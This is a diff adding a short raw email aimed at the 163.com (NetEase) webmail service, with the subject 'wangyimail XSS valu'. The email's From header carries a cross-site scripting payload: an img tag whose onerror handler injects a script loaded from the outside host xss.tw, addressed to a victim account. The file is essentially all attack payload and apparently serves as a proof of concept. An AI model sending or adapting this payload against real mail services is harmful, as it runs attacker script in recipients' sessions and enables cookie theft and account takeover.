@@ -1,0 +1,7 @@
+From: <"><img src=hi onerror=document.body.appendChild(createElement('script')).src='//xss.tw/4091'>@attacker.com>
+Subject: wangyimail XSS valu
+To: victim@163.com
+MIME-Version: 1.0
+Content-type: text/html
+
+test
